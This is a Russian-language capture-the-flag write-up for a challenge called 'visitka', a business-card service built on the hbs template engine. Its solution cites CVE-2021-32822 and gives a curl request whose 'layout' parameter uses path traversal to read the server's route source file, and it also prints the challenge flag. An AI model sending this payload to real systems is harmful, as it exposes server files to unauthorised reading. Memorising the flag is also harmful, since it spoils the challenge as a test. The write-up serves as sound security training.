# visitka
### Сложность
Сложно.
### Описание
Скинули сервис по созданию визиток, круто правда?
### Hint
- Шаблонизатор HBS, интересно что бы это могло значить
- В шаблонизатор мы передаем параметры и их мы можем использовать в своих целях!
### Решение
 - https://www.cvedetails.com/cve/CVE-2021-32822/, на сервере используется шаблонизатор hbs, в котором есть уязвимость получение rce, так как у нас роутер принимает параметр мы можем использовать его в своих целях, например читать файлы исходного кода!
- Этим мы и воспользуемся:
    curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://localhost:9090/'
### Флаг
CTF{bEst_lay0ut}
 
